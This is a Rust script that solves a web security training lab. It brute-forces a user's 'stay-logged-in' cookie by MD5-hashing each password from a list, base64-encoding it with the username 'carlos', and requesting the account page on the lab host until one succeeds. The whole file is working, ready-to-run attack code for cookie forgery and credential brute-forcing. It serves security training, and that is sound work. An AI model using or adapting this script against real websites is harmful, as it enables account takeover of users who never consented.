/*************************************************************************
*
* Lab: Brute-forcing a stay-logged-in cookie
*
* Hack Steps: 
*      1. Read password list
*      2. Hash every the password
*      3. Encrypt every tha hash with the username in the cookie
*      4. Fetch carlos profile with every encrypted cookie
*
**************************************************************************/
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
use lazy_static::lazy_static;
use reqwest::{
    self,
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    fs,
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7f003903554f7181313e2c009a009a.web-security-academy.net";

lazy_static! {
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
}

fn main() {
    print!("⦗1⦘ Reading password list.. ");

    let password_list = read_password_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
    let total_count = password_list.iter().count();

    println!("{}", "OK".green());
    println!("⦗2⦘ Brute forcing carlos password.. ");

    for (counter, password) in password_list.iter().enumerate() {
        let password_hash = format!("{:x}", md5::compute(password));
        let cookie_encoded = STANDARD_NO_PAD.encode(format!("carlos:{password_hash}"));

        let login = fetch_with_cookie("/my-account", &cookie_encoded);
        if login.status().as_u16() == 200 {
            println!("\n🗹 Correct password: {}", password.green());
            break;
        } else {
            print_progress(counter, total_count, password);
        }
    }

    print_finish_message();
}

fn read_password_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn fetch_with_cookie(path: &str, cookie: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("stay-logged-in={cookie}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn print_progress(counter: usize, total_count: usize, password: &str) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
    print!(
        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{total_count}): {:50}",
        elapsed_time.yellow(),
        counter + 1,
        password.blue()
    );
    io::stdout().flush().unwrap();
}

fn print_finish_message() {
    let elapsed_time = SCRIPT_START_TIME.elapsed().as_secs().to_string();
    println!("🗹 Finished in: {} seconds", elapsed_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green());
}
